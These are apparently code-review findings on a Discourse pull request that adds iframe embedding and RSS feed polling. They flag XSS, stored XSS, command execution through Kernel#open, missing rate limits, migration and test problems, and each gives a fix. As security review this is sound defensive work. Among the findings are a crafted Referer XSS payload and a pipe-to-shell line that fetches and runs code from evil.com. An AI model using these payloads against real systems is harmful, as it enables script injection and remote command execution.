findings.title: Unescaped request.referer interpolated into inline JavaScript (XSS)
findings.body: The embed layout writes `parent.postMessage({...}, '<%= request.referer %>')`, injecting the raw `Referer` request header into a single-quoted JS string literal with no escaping (no `j`/`escape_javascript`, and ERB's HTML escaping does not help inside a JS string). The only validation performed is `EmbedController#ensure_embeddable`, which checks the *host* of the referer; the path, query and fragment are free-form and may legally contain `'`, so an attacker who can get a victim to load `embed/best` with a crafted Referer (e.g. `http://<embeddable_host>/#'+alert(document.cookie)+'`) gets script execution in the forum's origin. Escape with `escape_javascript` (or, better, compute and emit only the scheme+host origin).

findings.title: Feed HTML stored as raw_html and rendered unescaped (stored XSS)
findings.body: Feed item bodies are run through `CGI.unescapeHTML` (turning `<script>` back into real tags) and handed to `TopicEmbed.import`, which creates the post with `cook_method: Post.cook_methods[:raw_html]`. `Post#cook` then returns `raw` verbatim (app/models/post.rb:133) and the embed view renders it with `<%= raw post.cooked %>` (app/views/embed/best.html.erb:19), as does the normal topic view. No sanitization step exists anywhere in this path, so any script/iframe/onerror payload in a polled RSS/Atom feed (or in a compromised/hijacked feed URL) becomes stored XSS for every forum visitor. The raw HTML should be sanitized (e.g. via `Sanitize`/the existing allowed-tag whitelist) before being stored as `raw_html`.

findings.title: `<%- end if %>` produces a stray modifier-if that breaks the header block
findings.body: Line 6 emits the Ruby code `end if` instead of `end`. The compiled template therefore becomes `if ... else ... end if <next generated statement>`, i.e. the whole if/else expression turns into a modifier-if whose condition is the following generated line (the logo `link_to` append). Depending on the ERB compiler this either raises a syntax error when the template is compiled (500 on every embed request) or silently reorders the output so the logo is appended before the button. Change it to `<%- end %>`.

findings.title: `i.content` is nil for RSS 2.0 feeds, raising NoMethodError and killing the job
findings.body: `content = CGI.unescapeHTML(i.content.scrub)` assumes every feed item exposes a `content` field. SimpleRSS returns nil for keys that are absent, and RSS 2.0 items carry the body in `description` (Atom uses `content`/`summary`). For a plain RSS feed this raises `NoMethodError: undefined method 'scrub' for nil`. Because the job is declared `sidekiq_options retry: false`, the whole hourly poll aborts on the first such item and nothing is imported, with no fallback. Fall back to `i.description`/`i.summary` and skip items with blank content.

findings.title: Kernel#open on a site-setting URL allows command execution and has no timeouts
findings.body: `SimpleRSS.parse open(SiteSetting.feed_polling_url)` uses `Kernel#open` with open-uri semantics: a value beginning with `|` (e.g. `|curl evil.com/x | sh`) is executed as a shell command, so an admin-editable (and, in multisite setups, potentially less-trusted) site setting becomes remote command execution in the Sidekiq process. There is also no read/open timeout or size limit, so a slow or huge feed can hang the worker indefinitely. Validate the scheme (http/https only) and fetch with `URI.parse(...).open` / a real HTTP client with timeouts.

findings.title: Anonymous requests can trigger unbounded remote fetches and topic creation for arbitrary URLs
findings.body: `best` enqueues `Jobs::RetrieveTopic` for any `embed_url` whose host matches `embeddable_host`, with no authentication required. `TopicRetriever` only throttles per exact URL (60s), so a client can iterate over arbitrary paths/query strings on the embeddable host (`?x=1`, `?x=2`, ...) and cause the forum to (a) create an unbounded number of redis throttle keys, (b) issue an unbounded number of outbound HTTP fetches, and (c) create a new topic/post per distinct URL, including for 404/garbage pages. A global rate limit (per IP and/or per site) and a check that the retrieved page is a real article are needed.

findings.title: `post.present?` does not mean the post was saved; can violate NOT NULL on topic_embeds
findings.body: `PostCreator#create` returns the (possibly unsaved) `@post` object even when validation fails — `save_post` raises `ActiveRecord::Rollback`, which inside this nested `Topic.transaction` block is swallowed rather than rolling back. `post.present?` is therefore true for an unsaved record, and `TopicEmbed.create!(topic_id: post.topic_id, post_id: post.id, ...)` runs with nil ids, violating the `null: false` constraints added in 20131217174004 and raising a StatementInvalid out of the job. Check `post.try(:persisted?)` / `creator.errors.blank?` instead.

findings.title: New embed assets are not added to the asset precompile list
findings.body: The layout references `stylesheet_link_tag 'embed'` and the new `app/assets/javascripts/embed.js` is meant to be served to third-party sites, but neither asset is added to `config.assets.precompile` (no change to config/application.rb or an initializer in this PR). Discourse precompiles an explicit whitelist, so in production `embed.css` / `embed.js` will not exist and every `embed/best` request will raise `Sprockets::Rails::Helper::AssetNotPrecompiled` / 500. Add both files to the precompile list.

findings.title: `force: true` added to an already-committed migration can drop a populated table
findings.body: This migration existed before the PR and has already run on deployed installs; adding `force: true` has no effect there, but it makes the migration destructive if it is ever re-run (e.g. after a `rake db:migrate:redo`, a rollback/re-apply, or a schema reload), because `create_table ... force: true` issues a `DROP TABLE top_topics` first and silently discards the existing rows. The same pattern is used for the new `topic_embeds` table (db/migrate/20131217174004_create_topic_embeds.rb:3). `force: true` should not be used in migrations.

findings.title: import mutates the caller's `contents` string
findings.body: `contents << "\n<hr>..."` appends the attribution footer in place, so the caller's string object is modified as a side effect (e.g. the `content` local in PollFeed, or anything a plugin/thor task passes in). If a frozen or shared string is passed the call raises `RuntimeError: can't modify frozen String`, and repeated calls with the same object accumulate footers. Use `contents = contents + "..."` / `+=`.

findings.title: absolutize_urls mangles protocol-relative URLs and ignores path-relative ones
findings.body: The check `href.start_with?('/')` also matches protocol-relative URLs such as `//cdn.example.com/x.png`; `sub(/^\/+/, '')` then strips both slashes producing `http://feedhost/cdn.example.com/x.png`, i.e. a broken link/image for every protocol-relative asset in a feed (very common for CDN-hosted images). Conversely, truly relative references (`images/x.png`, `../x`) are left untouched and will resolve against the Discourse host. Resolving with `URI.join(url, href)` handles all of these cases correctly.

findings.title: setnx followed by a separate expire can leave a permanent throttle key
findings.body: `$redis.setnx(key, "1")` and `$redis.expire(key, 60)` are two round trips; if the process dies (or redis fails) between them, the key is left with no TTL and `retrieved_recently?` returns true forever, permanently blocking retrieval of that embed URL for non-staff users. Use a single atomic `SET key 1 NX EX 60`.

findings.title: postMessage origin check uses substring matching instead of comparing origins
findings.body: `if (discourseUrl.indexOf(e.origin) === -1) { return; }` accepts any `event.origin` that happens to be a substring of the configured `discourseUrl` (and would silently accept everything if `discourseUrl` were ever empty). Derive the expected origin from `discourseUrl` (scheme + host + optional port) and compare it with `e.origin` for strict equality, so only the forum frame can resize the iframe.

findings.title: Negative PollFeed specs pass vacuously
findings.body: `feed_polling_enabled` defaults to false (config/site_settings.yml), so the "requires feed_polling_url" and "requires embed_by_username" examples would pass even if those two conditions were removed from `execute` — the first condition already short-circuits. Each example should stub the other settings to valid values so that only the condition under test is false. Note also that `poll_feed` itself (feed parsing, url fallback, content handling) has no test coverage at all.

findings.title: "is 404 without an embed_url" does not exercise the missing-parameter path
findings.body: `embeddable_host` defaults to `''`, so `ensure_embeddable` raises `Discourse::InvalidAccess` before the action (and thus before `params.require(:embed_url)`) ever runs. The example passes for the wrong reason and gives no coverage of the missing-parameter behaviour; it also asserts only `should_not be_success` rather than the claimed 404. Stub `embeddable_host` and a matching referer, then assert the actual status returned for a missing `embed_url`.

findings.title: import_remote calls open() without requiring open-uri
findings.body: `open(url).read` relies on open-uri being loaded, but topic_embed.rb only requires nokogiri; the `require 'open-uri'` lives in app/jobs/scheduled/poll_feed.rb. When `import_remote` is reached via `Jobs::RetrieveTopic` -> `TopicRetriever` (neither of which loads poll_feed or open-uri), `open` is plain `Kernel#open` and an http URL fails with `Errno::ENOENT`. Add `require 'open-uri'` to this file (and prefer `URI.parse(url).open` so a `|command` string can never be executed).

findings.title: Only the Rails 4 lockfile was regenerated for the new gems
findings.body: `ruby-readability` and `simple-rss` are added unconditionally to the Gemfile, but only `Gemfile_rails4.lock` is updated. The Gemfile explicitly supports dual-booting (RAILS3 / RAILS_MASTER) with separate lockfiles, so booting in those modes will hit an out-of-sync lockfile and require a `bundle install` (or fail in deployment/frozen mode). Regenerate the other lockfiles as part of this change.
